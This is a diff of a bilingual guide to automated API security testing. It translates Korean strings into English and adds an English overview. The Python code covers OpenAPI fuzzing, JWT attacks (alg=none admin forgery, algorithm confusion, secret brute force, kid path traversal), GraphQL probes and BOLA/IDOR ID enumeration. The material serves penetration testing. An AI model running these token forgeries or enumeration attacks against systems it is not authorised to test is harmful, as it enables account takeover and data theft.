@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # API 보안 테스트 자동화
 
 OpenAPI 명세 기반 자동 퍼징, OAuth/JWT 보안 테스트, GraphQL 취약점 자동화, 비즈니스 로직 취약점 테스트를 Python으로 구현한다.
@@ -161,31 +167,31 @@ class OpenAPIFuzzer:
     def _analyze_response(self, resp: requests.Response, payload: Any) -> str:
         # 서버 오류는 잠재적 취약점
         if resp.status_code == 500:
-            return f"서버 오류 (500) — 내부 오류 노출 가능"
+            return f"Server error (500) — possible internal error exposure"
 
         body = resp.text.lower()
 
         # 오류 메시지에서 기술 스택 노출
         if any(kw in body for kw in ["traceback", "exception", "stack trace", "sql syntax", "ora-"]):
-            return f"스택 트레이스/DB 오류 노출"
+            return f"Stack trace/DB error exposure"
 
         # SQLi 징후
         if any(kw in body for kw in ["mysql", "postgresql", "sqlite", "syntax error near"]):
-            return f"SQL 오류 메시지 노출 — SQLi 가능성"
+            return f"SQL error message exposure — possible SQLi"
 
         # 경로 탐색 성공
         if "root:" in resp.text or "daemon:" in resp.text:
-            return f"경로 탐색 성공 — /etc/passwd 내용 포함"
+            return f"Path traversal successful — /etc/passwd content included"
 
         # 응답 시간 기반 (10초 이상 = 시간 기반 인젝션)
         if resp.elapsed.total_seconds() > 8:
-            return f"응답 지연 ({resp.elapsed.total_seconds():.1f}초) — 시간 기반 인젝션 가능성"
+            return f"Response delay ({resp.elapsed.total_seconds():.1f}s) — possible time-based injection"
 
         return ""
 
     def run(self) -> list[FuzzResult]:
         all_results = []
-        print(f"[*] {len(self.endpoints)}개 엔드포인트 퍼징 시작")
+        print(f"[*] Starting fuzzing of {len(self.endpoints)} endpoints")
         for endpoint in self.endpoints:
             results = self.fuzz_endpoint(endpoint)
             all_results.extend(results)
@@ -196,17 +202,17 @@ class OpenAPIFuzzer:
 
 
 def main() -> None:
-    parser = argparse.ArgumentParser(description="OpenAPI 자동 퍼저")
-    parser.add_argument("spec", help="OpenAPI 명세 파일 (JSON/YAML)")
-    parser.add_argument("--base-url", required=True, help="API 기본 URL")
-    parser.add_argument("--api-key", default="", help="인증 토큰")
-    parser.add_argument("-o", "--output", help="결과 JSON 저장")
+    parser = argparse.ArgumentParser(description="OpenAPI Auto Fuzzer")
+    parser.add_argument("spec", help="OpenAPI spec file (JSON/YAML)")
+    parser.add_argument("--base-url", required=True, help="API base URL")
+    parser.add_argument("--api-key", default="", help="Authentication token")
+    parser.add_argument("-o", "--output", help="Save results JSON")
     args = parser.parse_args()
 
     fuzzer = OpenAPIFuzzer(args.spec, args.base_url, args.api_key)
     results = fuzzer.run()
 
-    print(f"\n[+] 총 {len(results)}개 취약점 후보 발견")
+    print(f"\n[+] Found {len(results)} vulnerability candidates")
     if args.output:
         import json as json_mod
         Path(args.output).write_text(
@@ -264,16 +270,16 @@ class JWTSecurityTester:
         return f"{h}.{p}.{s}"
 
     def test_algorithm_none(self) -> Optional[str]:
-        """alg=none 공격: 서명 검증 우회"""
+        """alg=none attack: bypass signature verification"""
         modified_header = {**self.header, "alg": "none"}
         modified_payload = {**self.payload, "role": "admin", "exp": int(time.time()) + 3600}
         token = self._encode_token(modified_header, modified_payload, b"")
-        # 서명 부분을 완전히 제거
+        # Remove signature part entirely
         parts = token.split(".")
         return f"{parts[0]}.{parts[1]}."
 
     def test_hs256_with_rs256_pubkey(self, public_key: str) -> Optional[str]:
-        """RS256 → HS256 알고리즘 혼동 공격"""
+        """RS256 → HS256 algorithm confusion attack"""
         modified_header = {**self.header, "alg": "HS256"}
         modified_payload = {**self.payload, "role": "admin"}
 
@@ -290,7 +296,7 @@ class JWTSecurityTester:
         return f"{h}.{p}.{s}"
 
     def test_weak_secret(self, wordlist: Optional[list[str]] = None) -> Optional[str]:
-        """약한 비밀키 브루트포스"""
+        """Weak secret brute force"""
         if wordlist is None:
             wordlist = [
                 "secret", "password", "12345", "admin", "key",
@@ -311,15 +317,15 @@ class JWTSecurityTester:
         return None
 
     def test_expiry_bypass(self) -> str:
-        """만료 시간 조작"""
+        """Expiration time manipulation"""
         modified_payload = {**self.payload, "exp": 9999999999}
         return self._encode_token(self.header, modified_payload, self.signature)
 
     def test_kid_injection(self) -> str:
-        """kid (Key ID) SQL/Path 인젝션"""
+        """kid (Key ID) SQL/Path injection"""
         modified_header = {
             **self.header,
-            "kid": "../../dev/null",  # 빈 파일로 빈 키 사용
+            "kid": "../../dev/null",  # Use empty file as empty key
         }
         sig = hmac.new(b"", f"{self.original_token.split('.')[0]}.{self.original_token.split('.')[1]}".encode(), hashlib.sha256).digest()
         return self._encode_token(modified_header, self.payload, sig)
@@ -327,26 +333,26 @@ class JWTSecurityTester:
     def run_all_tests(self) -> dict:
         results = {}
 
-        print("[*] alg=none 공격 테스트...")
+        print("[*] Testing alg=none attack...")
         results["alg_none"] = self.test_algorithm_none()
 
-        print("[*] 약한 비밀키 브루트포스...")
+        print("[*] Brute forcing weak secret...")
         weak_key = self.test_weak_secret()
         results["weak_key"] = weak_key
         if weak_key:
-            print(f"  [!!!] 약한 키 발견: {weak_key}")
+            print(f"  [!!!] Weak key found: {weak_key}")
 
-        print("[*] kid 인젝션 페이로드 생성...")
+        print("[*] Generating kid injection payload...")
         results["kid_injection"] = self.test_kid_injection()
 
         return results
 
 
 def main() -> None:
-    parser = argparse.ArgumentParser(description="JWT 보안 테스터")
-    parser.add_argument("token", help="분석할 JWT 토큰")
-    parser.add_argument("--target", help="테스트 대상 URL")
-    parser.add_argument("--wordlist", help="비밀키 워드리스트 파일")
+    parser = argparse.ArgumentParser(description="JWT Security Tester")
+    parser.add_argument("token", help="JWT token to analyze")
+    parser.add_argument("--target", help="Target URL for testing")
+    parser.add_argument("--wordlist", help="Secret key wordlist file")
     args = parser.parse_args()
 
     wordlist = None
@@ -355,8 +361,8 @@ def main() -> None:
 
     tester = JWTSecurityTester(args.target or "http://localhost", args.token)
 
-    print(f"[*] 헤더: {tester.header}")
-    print(f"[*] 페이로드: {tester.payload}")
+    print(f"[*] Header: {tester.header}")
+    print(f"[*] Payload: {tester.payload}")
 
     results = tester.run_all_tests()
     for test_name, result in results.items():
@@ -417,43 +423,43 @@ class GraphQLSecurityTester:
                 return {
                     "enabled": True,
                     "types": types[:20],
-                    "finding": "인트로스펙션 활성화 — 스키마 완전 노출 가능",
+                    "finding": "Introspection enabled — full schema exposure possible",
                 }
         except Exception:
             pass
         return {"enabled": False}
 
     def test_batch_query(self, simple_query: str) -> dict:
-        """배치 쿼리로 속도 제한 우회 테스트"""
+        """Test rate limit bypass via batch queries"""
         batch = [{"query": simple_query}] * 100
         try:
             resp = self.session.post(self.endpoint, json=batch, timeout=30, verify=False)
             if isinstance(resp.json(), list) and len(resp.json()) == 100:
-                return {"vulnerable": True, "finding": "배치 쿼리 허용 — 속도 제한 우회 가능"}
+                return {"vulnerable": True, "finding": "Batch queries allowed — rate limit bypass possible"}
         except Exception:
             pass
         return {"vulnerable": False}
 
     def test_depth_limit(self) -> dict:
-        """깊이 제한 없는 쿼리 (DoS 가능성)"""
+        """Unbounded depth query (potential DoS)"""
         deep_query = "{ " + "user { " * 20 + "id " + "} " * 20 + " }"
         try:
             result = self.query(deep_query)
             if "errors" not in result:
-                return {"vulnerable": True, "finding": "쿼리 깊이 제한 없음 — DoS 가능"}
+                return {"vulnerable": True, "finding": "No query depth limit — DoS possible"}
         except Exception:
             pass
         return {"vulnerable": False}
 
     def test_field_suggestion(self) -> dict:
-        """필드 제안으로 숨겨진 필드 발견"""
-        result = self.query("{ user { pasword } }")  # 오타 의도
+        """Discover hidden fields via field suggestions"""
+        result = self.query("{ user { pasword } }")  # Intentional typo
         errors = result.get("errors", [])
         for error in errors:
             message = error.get("message", "")
             if "Did you mean" in message:
                 return {
-                    "finding": f"필드 제안 기능 활성화: {message}",
+                    "finding": f"Field suggestion feature active: {message}",
                     "suggested_fields": message,
                 }
         return {}
@@ -468,7 +474,7 @@ class GraphQLSecurityTester:
                 result = self.query(query)
                 body = json.dumps(result)
                 if any(kw in body.lower() for kw in ["syntax error", "mysql", "postgresql", "sql"]):
-                    findings.append(f"SQL 오류 노출: {payload}")
+                    findings.append(f"SQL error exposure: {payload}")
             except Exception:
                 pass
 
@@ -477,25 +483,25 @@ class GraphQLSecurityTester:
     def run_all_tests(self) -> dict:
         results = {}
 
-        print("[*] 인트로스펙션 테스트...")
+        print("[*] Introspection test...")
         results["introspection"] = self.test_introspection()
 
-        print("[*] 배치 쿼리 테스트...")
+        print("[*] Batch query test...")
         results["batch_query"] = self.test_batch_query("{ __typename }")
 
-        print("[*] 깊이 제한 테스트...")
+        print("[*] Depth limit test...")
         results["depth_limit"] = self.test_depth_limit()
 
-        print("[*] 필드 제안 테스트...")
+        print("[*] Field suggestion test...")
         results["field_suggestion"] = self.test_field_suggestion()
 
         return results
 
 
 def main() -> None:
-    parser = argparse.ArgumentParser(description="GraphQL 보안 테스터")
-    parser.add_argument("endpoint", help="GraphQL 엔드포인트 URL")
-    parser.add_argument("--token", help="인증 토큰")
+    parser = argparse.ArgumentParser(description="GraphQL Security Tester")
+    parser.add_argument("endpoint", help="GraphQL endpoint URL")
+    parser.add_argument("--token", help="Authentication token")
     args = parser.parse_args()
 
     headers = {"Authorization": f"Bearer {args.token}"} if args.token else {}
@@ -548,7 +554,7 @@ class BOLATester:
                 return {
                     "id": object_id,
                     "url": url,
-                    "finding": f"BOLA 취약점: 공격자가 ID {object_id} 접근 성공",
+                    "finding": f"BOLA vulnerability: attacker successfully accessed ID {object_id}",
                     "victim_response_len": len(victim_resp.text),
                     "attacker_response_len": len(attacker_resp.text),
                 }
@@ -566,9 +572,9 @@ class BOLATester:
 
 
 def main() -> None:
-    parser = argparse.ArgumentParser(description="BOLA/IDOR 테스터")
+    parser = argparse.ArgumentParser(description="BOLA/IDOR Tester")
     parser.add_argument("base_url")
-    parser.add_argument("path_template", help="예: /api/users/{id}/profile")
+    parser.add_argument("path_template", help="e.g.: /api/users/{id}/profile")
     parser.add_argument("--victim-token", required=True)
     parser.add_argument("--attacker-token", required=True)
     parser.add_argument("--id-start", type=int, default=1)
@@ -577,9 +583,106 @@ def main() -> None:
 
     tester = BOLATester(args.base_url, args.victim_token, args.attacker_token)
     findings = tester.test_idor(args.path_template, range(args.id_start, args.id_end + 1))
-    print(f"\n[+] BOLA 취약점: {len(findings)}건 발견")
+    print(f"\n[+] BOLA vulnerabilities: {len(findings)} found")
 
 
 if __name__ == "__main__":
     main()
+```
+
+---
+
+<a name="english"></a>
+
+# API Security Testing Automation
+
+This document implements OpenAPI spec-based auto-fuzzing, OAuth/JWT security testing, GraphQL vulnerability automation, and business logic vulnerability testing in Python.
+
+---
+
+## 1. OpenAPI-based Auto Fuzzing
+
+### 1.1 Swagger/OpenAPI Parser and Fuzzer
+
+The `OpenAPIFuzzer` class parses an OpenAPI specification file (JSON or YAML), enumerates all endpoints, and fuzzes each parameter with a set of dangerous payloads including SQL injection strings, XSS payloads, path traversal strings, template injection markers, and boundary values.
+
+**Key components:**
+- `_parse_endpoints()` — extracts all path/method combinations from the spec
+- `_generate_fuzz_values(schema)` — generates type-appropriate fuzz values per parameter type (string, integer, boolean, array)
+- `fuzz_endpoint(endpoint)` — sends fuzz payloads and records findings
+- `_analyze_response(resp, payload)` — classifies responses: HTTP 500 errors, stack traces, SQL error messages, path traversal success indicators, and time-based injection delays
+
+**Usage:**
+```bash
+python3 api_fuzzer.py openapi.yaml --base-url https://api.example.com --api-key TOKEN -o results.json
+```
+
+---
+
+## 2. JWT Security Testing
+
+### 2.1 Automated JWT Vulnerability Detection
+
+The `JWTSecurityTester` class implements multiple JWT attack techniques:
+
+| Attack | Method | Description |
+|--------|--------|-------------|
+| **alg=none** | `test_algorithm_none()` | Sets algorithm to "none" and removes signature to bypass verification |
+| **Algorithm Confusion** | `test_hs256_with_rs256_pubkey()` | RS256 → HS256 confusion: signs with RSA public key as HMAC secret |
+| **Weak Secret Brute Force** | `test_weak_secret()` | Tests common secrets against the original signature |
+| **Expiry Bypass** | `test_expiry_bypass()` | Sets exp to year 2286 (9999999999) |
+| **kid Injection** | `test_kid_injection()` | Injects path traversal into the kid header field |
+
+**Usage:**
+```bash
+python3 jwt_tester.py <TOKEN> --target https://api.example.com --wordlist secrets.txt
+```
+
+---
+
+## 3. GraphQL Security Testing
+
+The `GraphQLSecurityTester` class tests four common GraphQL vulnerabilities:
+
+| Test | Finding | Risk |
+|------|---------|------|
+| **Introspection** | Full schema exposed | Medium — attackers can enumerate all types, fields, and mutations |
+| **Batch Queries** | Rate limiting bypassed | Medium — 100 parallel queries sent in a single request |
+| **Depth Limit** | No query depth restriction | High — deeply nested queries can cause DoS |
+| **Field Suggestion** | Hidden fields discoverable | Low — typo-based error messages leak field names |
+
+Additional SQL injection testing through GraphQL arguments is also implemented via `test_sql_injection_via_graphql()`.
+
+**Usage:**
+```bash
+python3 graphql_tester.py https://api.example.com/graphql --token TOKEN
+```
+
+---
+
+## 4. BOLA/IDOR Automated Detection
+
+The `BOLATester` class implements a two-token BOLA (Broken Object Level Authorization) test:
+
+1. The **victim session** requests a resource by ID — if it returns HTTP 200, the resource exists
+2. The **attacker session** requests the same resource — if it also returns HTTP 200, BOLA is confirmed
+
+The test runs in parallel with a thread pool (default 10 workers) across a configurable ID range.
+
+**Usage:**
+```bash
+python3 bola_tester.py https://api.example.com /api/users/{id}/profile \
+    --victim-token VICTIM_JWT --attacker-token ATTACKER_JWT \
+    --id-start 1 --id-end 500
+```
+
+**Finding format:**
+```json
+{
+  "id": 42,
+  "url": "https://api.example.com/api/users/42/profile",
+  "finding": "BOLA vulnerability: attacker successfully accessed ID 42",
+  "victim_response_len": 312,
+  "attacker_response_len": 312
+}
 ```
